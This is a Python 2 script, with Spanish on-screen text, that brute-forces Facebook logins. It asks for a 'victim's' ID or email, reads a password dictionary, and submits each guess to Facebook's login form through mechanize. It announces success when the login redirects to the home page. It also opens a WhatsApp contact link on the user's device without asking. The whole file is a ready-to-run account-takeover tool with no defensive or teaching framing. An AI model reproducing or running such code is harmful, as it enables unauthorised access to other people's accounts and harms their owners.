#!usr/bin/python

import sys
import random
import mechanize
import cookielib
import os
os.system ("clear")
TUTO = '''
\033[1;32;40m
#                             #
 #############################
 #                           #
 #       "BIENVENIDOS"       # 
 #                           #
 #            A              #
 #                           #
 #  "FACEBOOK FUERZA BRUTA"  #
 #                           #
 #############################
#                             # 
'''
TUTO2 = '''
\033[1;32;40m
#                             # 
 #############################
 #                           #
 # SOMOS DE SOCIEDAD ANONIMA #
 #                           #
 #          NAHFER           #
 #############################
#                             #

          \nCREADO POR:CAPITAN COMANDO
            ###########################
            SI LO PUEDES IMAGINAR.
            ###########################
            LO PUEDES PROGRAMAR
            ###########################
            PORQUE EL CONOCIMIENTO ES LIBRE.

'''
TUTO3 = '''
\033[1;32;40m                                                           
SELECCIONA UNO DE ESTOS DICCIONARIOS
O TAMBIEN PUEDES PONER:
LA RUTA DE TU DICCIONARIO YA CREADO.
       
    
        

1.txt       2.txt      3.txt     4.txt    5.txt
'''
TUTO4 = '''
\033[1;32;40m
        ESCRIBE EL ID O El CORREO DE TU VICTIMA
'''
print TUTO
print TUTO2
print TUTO4
email = str(raw_input("\n\t >> : "))
os.system ("clear")
print TUTO
print TUTO2
print TUTO3
archivo = str(raw_input("\n\t Diccionario : "))

useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]



login = 'https://www.facebook.com/login.php?login_attempt=1'
os.system ("termux-open http://wa.me/5491133773596")
def attack(password):

  try:
     sys.stdout.write("\r\t      %s.. " % password)
     sys.stdout.flush()
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
     br.select_form(nr=0)

      
         
     
     br.form['email'] = email
     br.form['pass'] = password
     br.submit()
     log = br.geturl()
     if log == 'https://www.facebook.com/':    
        print ("\n\n\n Exelente Password Encontrado .. !!")
        sys.exit(1)
  except KeyboardInterrupt:
        print ("\n  Cerrando el programa.. ")
        sys.exit(1)

def search():
    global password
    for password in passwords:
        attack(password.replace("\n",""))



def check():
    global br
    global passwords
    try:
       br = mechanize.Browser()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
       print "\n\n\n Cerrando Programa ..\n"
       sys.exit(1)
    try:
       list = open(archivo, "r")
       passwords = list.readlines()
       k = 0
       while k < len(passwords):
          passwords[k] = passwords[k].strip()
          k += 1
    except IOError:
        print TUTO
        print TUTO2
        print(("""
\033[1;31;40m                                   
DICCIONARIO NO LOCALIZADO 
INTENTA CON ESTOS DICCIONARIOS
O CREA UNO NUEVO.

1.txt       2.txt      3.txt     4.txt    5.txt                            
""").encode('utf-8'))
        sys.exit(1)
    except KeyboardInterrupt:
        print "\n Cerrando Programa .."
        sys.exit(1)
    try:
 
        print TUTO
        print TUTO2
        print "\n      INTENTANDO HACKEAR CUENTA : %s" % (email)
        print "\t Cargando :" , len(passwords), "passwords"
        print "\t    ESPERANDO RESULTADOS ...\n "
    except KeyboardInterrupt:
        print ("\n\n\n TERMINANDO SESSION ..\n")
        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt:
        print ("\n\n\n TERMINANDO SESSION..\n")
        sys.exit(1)

if __name__ == '__main__':
    print TUTO
    print TUTO2
    os.system ("clear")
    check()
